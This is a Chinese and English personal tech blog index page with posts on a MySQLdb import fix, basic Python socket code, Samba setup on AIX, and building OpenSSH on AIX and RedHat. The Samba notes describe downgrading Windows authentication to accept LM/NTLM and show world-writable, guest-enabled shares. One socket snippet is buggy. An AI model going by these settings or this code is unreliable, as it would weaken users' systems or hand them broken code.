<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>&lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="<(￣ c￣)y▂ξ 真煩,來哈根草吧~">
<meta property="og:url" content="http://0daybug.github.io/index.html">
<meta property="og:site_name" content="<(￣ c￣)y▂ξ 真煩,來哈根草吧~">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="<(￣ c￣)y▂ξ 真煩,來哈根草吧~">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="&lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" type="text/css">
  
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
  
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/avatar.png" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/">Dylan Kios</a></h1>
        </hgroup>

        
                


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <li id="Email"><a class="Email" target="_blank" href="mailto:likewindjustgone@gmail.com" title="Email"></a></li>
                            
                                <li id="GitHub"><a class="GitHub" target="_blank" href="/#" title="GitHub"></a></li>
                            
                                <li id="RSS"><a class="RSS" target="_blank" href="/atom.xml" title="RSS"></a></li>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/AIX/" style="font-size: 12.5px;">AIX</a> <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/Google-Hack/" style="font-size: 10px;">Google Hack</a> <a href="/tags/Information-Gathering/" style="font-size: 10px;">Information Gathering</a> <a href="/tags/Learning-Scrapy/" style="font-size: 10px;">Learning Scrapy</a> <a href="/tags/Linux/" style="font-size: 12.5px;">Linux</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/Penetration-Testing/" style="font-size: 15px;">Penetration Testing</a> <a href="/tags/Problems/" style="font-size: 10px;">Problems</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Socket/" style="font-size: 10px;">Socket</a> <a href="/tags/Understanding-Network-Hacks/" style="font-size: 20px;">Understanding Network Hacks</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/iOS学习/" style="font-size: 10px;">iOS学习</a> <a href="/tags/乱七八糟/" style="font-size: 10px;">乱七八糟</a> <a href="/tags/渗透测试/" style="font-size: 17.5px;">渗透测试</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.github.com/0daybug/">GitHub</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://weibo.com/styhunger/">Weibo</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">专注于网络安全</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Dylan Kios</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/avatar.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Dylan Kios</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <li id="Email"><a class="Email" target="_blank" href="mailto:likewindjustgone@gmail.com" title="Email"></a></li>
                            
                                <li id="GitHub"><a class="GitHub" target="_blank" href="/#" title="GitHub"></a></li>
                            
                                <li id="RSS"><a class="RSS" target="_blank" href="/atom.xml" title="RSS"></a></li>
                            
                        </ul>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-import-Mysqldb-error" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/25/import-Mysqldb-error/" class="article-date">
      <time datetime="2016-07-25T06:20:24.000Z" itemprop="datePublished">2016-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/25/import-Mysqldb-error/">import Mysqldb error</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="Can-not-import-Mysqldb"><a href="#Can-not-import-Mysqldb" class="headerlink" title="Can not import Mysqldb"></a>Can not import Mysqldb</h3><p>error Like this:<br>└─(14:11:27)──&gt; python -c “import MySQLdb”                        ──(一, 725)─┘<br>Traceback (most recent call last):<br>  File “<string>“, line 1, in <module><br>  File “/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/MySQLdb/<strong>init</strong>.py”, line 19, in <module><br>    import _mysql<br>ImportError: dlopen(/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/_mysql.so, 2): Library not loaded: libmysqlclient.18.dylib<br>  Referenced from: /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/_mysql.so<br>  Reason: image not found</module></module></string></p>
<h3 id="how-to-solve-it"><a href="#how-to-solve-it" class="headerlink" title="how to solve it?"></a>how to solve it?</h3><p>add the following stuff to your .bash_profile<br>mine is .zshrc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> DYLD_LIBRARY_PATH=/usr/<span class="built_in">local</span>/mysql-<span class="number">5.6</span>.<span class="number">27</span>-osx10.<span class="number">8</span>-x86_64/lib:<span class="variable">$DYLD_LIBRARY_PATH</span></span><br></pre></td></tr></table></figure>
<p>“/usr/local/mysql-5.6.27-osx10.8-x86_64/lib “ is my mysql location on OS X,<br>replace yours, and you will import the mysqldb successfully.</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Problems/">Problems</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-SocketProgram" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/20/SocketProgram/" class="article-date">
      <time datetime="2016-07-20T12:50:16.000Z" itemprop="datePublished">2016-07-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/20/SocketProgram/">SocketProgram</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_machine_info</span><span class="params">()</span>:</span></span><br><span class="line">    host_name = socket.gethostname()</span><br><span class="line">    ip_address = socket.gethostbyname(host_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Host name: %s"</span>%host_name</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"IP address: %s"</span>%ip_address</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print_machine_info()</span><br></pre></td></tr></table></figure>
<p>Running this script,we will get the basic info about our machine</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_remote_machine_info</span><span class="params">()</span>:</span></span><br><span class="line">    remote_host = <span class="string">'www.fuckbaidu.com'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"IP address: %s"</span>%socket.gethostbyname(remote_host)</span><br><span class="line">    <span class="keyword">except</span> socket.error,err_msg:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%s: %s"</span>%(remote_host, err_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    get_remote_machine_info()</span><br></pre></td></tr></table></figure>
<p>The Python socket library has utilities to deal with the various<br>IP address format.Here,we will use two of them:inet_aton() and<br>inet_ntoa()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_ip4_address</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ip_addr <span class="keyword">in</span> [<span class="string">'127.0.0.1'</span>,<span class="string">'192.168.1.1'</span>]:</span><br><span class="line">        packed_ip_addr = socket.inet_aton(ip_addr)</span><br><span class="line">        unpacked_ip_addr = socket.inet.ntoa(ip_addr)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"IP address: %s =&gt; Packed:%s, Unpacked:%s"</span>%(ip_addr,hexlify(packed_ip_addr), unpacked_ip_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    convert_ip4_address()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Socket/">Socket</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Samba-AIX-solutions" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/15/Samba-AIX-solutions/" class="article-date">
      <time datetime="2016-07-15T05:59:55.000Z" itemprop="datePublished">2016-07-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/15/Samba-AIX-solutions/">Samba AIX solutions</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>SAMBA:</p>
<h2 id="——————————————————————————–"><a href="#——————————————————————————–" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
<p>SAMBA CLIENT ALL:</p>
<p>install SAMBA:</p>
<p>bos.cifs_fs.5.3.0.0.I<br>bos.cifs_fs.rte.5.3.0.62.U</p>
<h2 id="bos-cifs-fs-smit-5-3-0-60-bff"><a href="#bos-cifs-fs-smit-5-3-0-60-bff" class="headerlink" title="bos.cifs_fs.smit.5.3.0.60.bff"></a>bos.cifs_fs.smit.5.3.0.60.bff</h2><p>smitty cifs_fs</p>
<p>lscifsmnt<br>rmcifsmnt -f /smb_mnt<br>mkcifsmnt -f /mnt -d share1 -h server1 -c user1</p>
<hr>
<p>smitty cifs_fs:<br>first it will do in read-only, later have to come back again and set it again<br>If Share name is like this: \server name\share name, it is enough to write “share name” (\server.. not needed)</p>
<pre><code>[Entry Fields]
</code></pre><ul>
<li>Pathname of mount point                             /homes/ftp/Test<br>SERVER name                                        [10.10.40.10]<br>User Name                                          [SSH01]<br>Password                                           []<br>Share name                                         [Test]        &lt;–what has been shared on the other system<br>Mount as a READ-ONLY system                        [no]          &lt;–first it will be read-only, come back again                                                                                                        +<br>uid                                                [6027083]<br>gid                                                [6000116]<br>Mode                                               [777]<br>Domain to Authenticate against                     []            &lt;–once on windows I had to set here: ads<br>Remount now, add change to /etc/filesystems,       [Both]<pre><code>or both
</code></pre>/etc/filesystems entry will mount on start         [no]<br>Mount Type name                                    []</li>
</ul>
<p>After these the credential file has to be set as well:<br>smitty cifs_fs -&gt; Credential configuration</p>
<p>/etc/cifs_fs/cifscred file      allows future mounting of CIFS shares with stored credentials<br>lscifscred                lists the server or user entries stored in the /etc/cifs_fs/cifscred file (mkcifscred, rmcifscred, chcifscred)</p>
<hr>
<p>other methods:<br>/usr/sbin/mkcifsmnt -t rw -f /homes/ftp/29/test -d test -h 10.10.15.24 -c SSG01 -p xyz -u 32292 -g 6000116 -x 777<br>mount -v cifs -n 10.10.15.24/SSG01/xyz -o uid=32292,gid=200,fmode=775 test /homes/ftp/29/test</p>
<hr>
<p>Once on Win side had to change something in order to work:<br>“I have changed something on the server - from “Send NTLMv2 response only. Refuse LM  NTLM” to “ Send LM &amp; NTLM - use NTLMv2 session security if negotiated” So I hope, this fixes the problem”</p>
<h2 id="——————————————————————————–-1"><a href="#——————————————————————————–-1" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
<h2 id="——————————————————————————–-2"><a href="#——————————————————————————–-2" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
<p>SAMBA SERVER ALL:</p>
<p>Needed ports:</p>
<p>netbios-ns        137/tcp           # NETBIOS Name Service<br>netbios-ns        137/udp           # NETBIOS Name Service<br>netbios-dgm       138/tcp           # NETBIOS Datagram Service<br>netbios-dgm       138/udp           # NETBIOS Datagram Service<br>netbios-ssn       139/tcp           # NETBIOS Session Service<br>netbios-ssn       139/udp           # NETBIOS Session Service</p>
<p>microsoft-ds      445/tcp           # Microsoft-DS<br>microsoft-ds      445/udp           # Microsoft-DS</p>
<p>netbios is Windows file &amp; printer sharing</p>
<p>Microsoft-DS (Microsoft Directory Services) is a port used for file sharing. It was introduced with Windows 2000 and gives you the possibility to use SMB protocol (stands for Server Message Block, but is also known as Samba) directly over TCP-IP on port 445.</p>
<p>In www.samba.org, written this:<br>UDP/137    - used by nmbd<br>UDP/138    - used by nmbd<br>TCP/139    - used by smbd<br>TCP/445    - used by smbd</p>
<p>INSTALL:</p>
<p>/mnt/MISC/SAMBA<br>-rwxrwxrwx   1 root     sys        67379200 Jun 28 2005  samba-3.0.4.0.bff</p>
<p>smitty install:<br>root@aix31: /mnt/MISC/SAMBA # lslpp -l | grep -i samba<br>  freeware.samba.rte         3.0.4.0  COMMITTED  Samba Version 3.0.4</p>
<hr>
<p>SWAT (SAMBA Web Administartion Tool) configuration: (not necessary, only if you want it)<br>It is a GUI for SAMBA, a web browser is needed for SWAT, and X11 as well.</p>
<p>/etc/services:<br>swat    901/tcp</p>
<p>/etc/inetd.conf:<br>swat    stream  tcp     nowait  root    /usr/local/samba/sbin/swat      swat</p>
<p>in browser:</p>
<h2 id="http-localhost-901"><a href="#http-localhost-901" class="headerlink" title="http://localhost:901"></a><a href="http://localhost:901" target="_blank" rel="external">http://localhost:901</a></h2><p>SAMBA tools:</p>
<p>install dir: /usr/local/samba</p>
<p>/usr/local/samba/sbin/nmbd                &lt;–provides netbios nameserver supports to clients (nameserver for samba)<br>/usr/local/samba/sbin/smbd                &lt;–smb daemon<br>/usr/local/samba/sbin/smbd -b             &lt;–shows configuration infos. i.e.: path for the config file: smbd -b|grep smb.conf<br>/usr/local/samba/bin/smbstatus            &lt;–shows actual sharings and connections<br>/usr/local/samba/bin/testparm             &lt;–test the smb.conf file for any typo<br>/usr/local/samba/bin/pdbedit -a user123   &lt;–creates users (on AIX I created before)<br>/usr/local/samba/bin/smbpasswd            &lt;–changes pw (-a: add a user who can access the shares from a client)<br>/usr/local/samba/bin/smbclient            &lt;–it is an SMB client program for UNIX machines, it provides an ftp like interface,</p>
<pre><code>to transfer files between a windows &apos;server&apos; and a unix &apos;client&apos;
</code></pre><hr>
<p>PROCESS OF SAMBA CONFIGURATION:</p>
<ol>
<li><p>check ports: a 137,138,139,445 (if needed firewall opening)<br>rpcinfo, telnet</p>
</li>
<li><p>check where is smb.conf:<br>/usr/local/samba/sbin/smbd -b               &lt;–shows version of SAMBA etc.,and the path to smb.conf</p>
</li>
<li><p>edit smb.conf:<br>/usr/local/samba/lib/smb.conf (it is a link to /etc/samba/smb.conf)</p>
</li>
</ol>
<p>Create a similar entry:</p>
<p>[samba_share]                               &lt;–use this name for connection<br>        comment = share test                &lt;–anything can be written here<br>        path = /home/samba_share            &lt;–path of the dir what we want to share<br>        read only = no<br>        guest ok = yes<br>        read list = user123                 &lt;–users who will be able to read it (space separated)<br>        write list = user123                &lt;–users who will be able to write to it (space separated)</p>
<p>Important:<br>-check owner,rights of the given directory (in the path)<br>-after chacnging the conf file, daemons have to be restarted in order changes be refreshed</p>
<hr>
<p>this is good for read only:<br>[samba_share]<br>   comment = share test<br>   path = /home/samba_share<br>   read only = no</p>
<h2 id="guest-ok-yes"><a href="#guest-ok-yes" class="headerlink" title="   guest ok = yes"></a>   guest ok = yes</h2><p>3.SAMBA user creation:<br>/usr/local/samba/bin/smbpasswd -a user123                  &lt;– -a: add user as well</p>
<p>Same user has to be created, to what we gave in the conf file</p>
<p>For root we can create one:<br>/usr/local/samba/bin/smbpasswd -a root<br>(root passw is needed)</p>
<ol>
<li>testing smb.conf:<br>/usr/local/samba/bin/testparm                              &lt;–test the smb.conf file for any typo (default conf file)</li>
</ol>
<p>testing not the default conf file:<br>/usr/local/samba/bin/testparm /etc/samba/smb.conf</p>
<ol>
<li><p>starting daemons:<br>/usr/local/samba/sbin/smbd -D                              &lt;– -D: handling it as daemon (this is the default)<br>/usr/local/samba/sbin/nmbd -D</p>
</li>
<li><p>connecting to SAMBA:</p>
</li>
</ol>
<p>LOCALLY (AIX):<br>/usr/local/samba/bin/smbclient //localhost/samba_share     &lt;–samba_share: which has been created in conf file</p>
<p>password is what has been created with smbpasswd for the user<br>if not root user, than check permissions of the conf file (if needed give read permission)</p>
<p>another way: /usr/local/samba/bin/smbclient -U% -L localhost</p>
<p>REMOTELY (WINDOWS):<br>(tools-&gt;map network drive-&gt;choose a drive)<br>the command: \10.10.101.78\samba_share                    &lt;–it will map that directory</p>
<p>“Connect using a different username”: If on Windows and AIX users are identical this is not needed.<br>If user/pw created in SAMBA is different of the actual windows user/pw, then here we can give the SAMBA user/pw.</p>
<ol>
<li>Checks, tests:<br>/usr/local/samba/bin/smbstatus                             &lt;–shows connections (if we could connect)</li>
</ol>
<p>/usr/local/samba/bin/smbclient -L 10.10.101.78             &lt;–shows which shares are available on a given host</p>
<p>!!!2 different SAMBA version (rpm and a fileset one) should no be installed at the same time (daemons did not started for me)!!!!</p>
<h2 id="——————————————————————————–-3"><a href="#——————————————————————————–-3" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
<p>I had this error:<br>(Samba was installed from rpm and it was started from inetd.)</p>
<h1 id="smbclient-L-localhost-U"><a href="#smbclient-L-localhost-U" class="headerlink" title="smbclient -L localhost -U "></a>smbclient -L localhost -U <user></user></h1><p>added interface ip=10.10.10.8 bcast=10.10.35.31 nmask=255.255.255.224<br>session request to LOCALHOST failed (Call returned zero bytes (EOF)<br>)<br>session request to *SMBSERVER failed (Call returned zero bytes (EOF)<br>)</p>
<ol>
<li><p>check samba logs (I turned this on)<br>vi /etc/inetd.conf: netbios-ssn stream tcp nowait root /usr/sbin/smbd -l /var/log/samba.log smbd<br>refresh -s inetd<br>(probably in syslog you can find where it is logging)</p>
</li>
<li><p>cat samba.log<br>…<br>[2012/10/11 09:20:11, 0] tdb/tdbutil.c:tdb_log(531)<br>tdb(/etc/secrets.tdb): rec_free_read bad magic 0x2f73616d at offset=812    &lt;–shows problems with /etc/secrets.tdb<br>[2012/10/11 09:20:11, 0] passdb/machine_sid.c:pdb_generate_sam_sid(163)<br>pdb_generate_sam_sid: Failed to store generated machine SID.<br>[2012/10/11 09:20:11, 0] smbd/server.c:main(793)<br>ERROR: Samba cannot create a SAM SID.</p>
</li>
<li><p>stop samba<br>vi /etc/inetd.conf -&gt; comment lines smbd, nmbd<br>refresh -s inetd</p>
</li>
<li><p>remove /etc/secrets.tdb<br>mv /etc/secrets.tdb /etc/secrets.tdb.old</p>
</li>
<li><p>start samba<br>vi /etc/inetd.conf -&gt; uncomment smbd, nmbd lines<br>refresh -s inetd</p>
</li>
<li><p>test login</p>
<h1 id="smbclient-L-localhost-U-1"><a href="#smbclient-L-localhost-U-1" class="headerlink" title="smbclient -L localhost -U "></a>smbclient -L localhost -U <user></user></h1><p>added interface ip=10.10.10.8 bcast=10.10.35.31 nmask=255.255.255.224<br>Password:</p>
</li>
</ol>
<hr>
<p>I had this “error”:</p>
<h1 id="smbstatus"><a href="#smbstatus" class="headerlink" title="smbstatus"></a>smbstatus</h1><p>Samba version 2.2.7</p>
<h2 id="Service-uid-gid-pid-machine"><a href="#Service-uid-gid-pid-machine" class="headerlink" title="Service      uid      gid      pid     machine"></a>Service      uid      gid      pid     machine</h2><p>Failed to open byte range locking database<br>ERROR: Failed to initialise locking database<br>Can’t initialise locking module - exiting</p>
<p>This is not an error after first successful login it will be OK.<br>I did: smbclient -L localhost -U <user><br>After that: smbstatus</user></p>
<p>Samba version 2.2.7</p>
<h2 id="Service-uid-gid-pid-machine-1"><a href="#Service-uid-gid-pid-machine-1" class="headerlink" title="Service      uid      gid      pid     machine"></a>Service      uid      gid      pid     machine</h2><p>No locked files</p>
<hr>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AIX/">AIX</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-IBM-AIX-6-install-Openssh-7-2p2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/06/IBM-AIX-6-install-Openssh-7-2p2/" class="article-date">
      <time datetime="2016-07-06T07:20:05.000Z" itemprop="datePublished">2016-07-06</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/06/IBM-AIX-6-install-Openssh-7-2p2/">IBM AIX 6 install Openssh 7.2p2</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="我先安装了zlib"><a href="#我先安装了zlib" class="headerlink" title="我先安装了zlib"></a>我先安装了zlib</h3><p>zlib 安装的版本是1.2.8，源代码可以从zlib的官网上下载<br><a href="http://www.zlib.net/" target="_blank" rel="external">Zlib</a><br>基本的步骤都是解包，然后./configure make &amp;&amp; make install</p>
<h3 id="安装Openssh7-2p2"><a href="#安装Openssh7-2p2" class="headerlink" title="安装Openssh7.2p2"></a>安装Openssh7.2p2</h3><p>这个步骤稍微复杂，我遇到一个错误，找到问题修改了源代码中几个地方<br>从openssh包中找到一个叫做sshbuf-getput-basic.c 的C文件<br>用VI编辑器打开，从代码中将所有va_copy替换成VA_COPY，我们可以使用vi编辑器<br>快捷键实现批量替换，<a href="">%s?va_copy?VA_COPY</a>,完成之后在代码宏定义下面加入<br>下面条件语句.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ifndef VA_COPY</span></span><br><span class="line"><span class="comment"># ifdef HAVE_VA_COPY</span></span><br><span class="line"><span class="comment">#  define VA_COPY(dest, src) va_copy(dest, src)</span></span><br><span class="line"><span class="comment"># else</span></span><br><span class="line"><span class="comment">#  ifdef HAVE___VA_COPY</span></span><br><span class="line"><span class="comment">#   define VA_COPY(dest, src) __va_copy(dest, src)</span></span><br><span class="line"><span class="comment">#  else</span></span><br><span class="line"><span class="comment">#   define VA_COPY(dest, src) (dest) = (src)</span></span><br><span class="line"><span class="comment">#  endif</span></span><br><span class="line"><span class="comment"># endif</span></span><br><span class="line"><span class="comment">#endif</span></span><br></pre></td></tr></table></figure>
<p>全部修改完毕后，进行./configure,然后没有报错就可以进项make &amp;&amp; make install</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>我这边的openssl没有升级，因为之前有安装过openssh所以一些依赖关系存在，还有<br>C编译器在我这边的AIX6里面是安装的，如果遇到无法gcc需要额外安装gcc编译器</p>
<p>Hope u enjoy！</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AIX/">AIX</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Update-Openssh-7-2p2-on-Redhat-5" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/05/Update-Openssh-7-2p2-on-Redhat-5/" class="article-date">
      <time datetime="2016-07-05T04:07:59.000Z" itemprop="datePublished">2016-07-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/05/Update-Openssh-7-2p2-on-Redhat-5/">Update Openssh 7.2p2 on Redhat 5</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="首先先检查依赖环境"><a href="#首先先检查依赖环境" class="headerlink" title="首先先检查依赖环境"></a>首先先检查依赖环境</h3><p>pam-devel openssl-devel zlib-devel krb5-devel</p>
<p>Zlib 1.1.4 or 1.2.1.2 or greater</p>
<h3 id="卸载之前安装的openssl"><a href="#卸载之前安装的openssl" class="headerlink" title="卸载之前安装的openssl"></a>卸载之前安装的openssl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm <span class="operator">-e</span> `rpm -qa | grep openssl` --allmatches -nodeps</span><br></pre></td></tr></table></figure>
<h3 id="解压我给你们的两个包"><a href="#解压我给你们的两个包" class="headerlink" title="解压我给你们的两个包"></a>解压我给你们的两个包</h3><p>tar -xzvf [Packege name]</p>
<h3 id="编译安装OpenSSl"><a href="#编译安装OpenSSl" class="headerlink" title="编译安装OpenSSl"></a>编译安装OpenSSl</h3><p>注意参数<br>注意使用root权限<br> （1）./config –prefix=/usr –shared<br> 注意，一定要加上–shared选项，否则openssh编译时候会找不到openssl的<br> library<br> 这部我这边出现了一个make depend报警，忽略即可</p>
<p> （2）安装<br>    make &amp;&amp; make install<br>  (3)验证安装是否成功<br>    openssl version -a</p>
